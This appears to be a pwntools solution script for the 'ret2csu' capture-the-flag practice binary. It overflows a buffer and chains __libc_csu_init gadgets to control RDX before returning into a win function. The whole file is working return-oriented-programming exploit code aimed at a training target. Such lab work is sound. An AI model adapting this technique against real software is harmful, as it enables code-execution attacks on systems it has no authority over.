from pwn import *

context.arch = "amd64"
context.binary = "./ret2csu"
elf = ELF("./ret2csu")
target = process("./ret2csu")

csu_gadget_pop = 0x40089A
csu_gadget_mov = 0x400880

ret2win = 0x4007B1
init_ptr = 0x400560

padding = b"0" * (0x20 + 8)

target.recvuntil(b"> ")

payload = flat(
    padding,
    csu_gadget_pop,
    0,
    0,
    init_ptr,
    0,
    0,
    0,
    csu_gadget_mov,
    [0] * 7,
    ret2win,
)

target.sendline(payload)
log.success("__libc_csu_init gadgets chained successfully! RDX register hijacked.")
target.interactive()
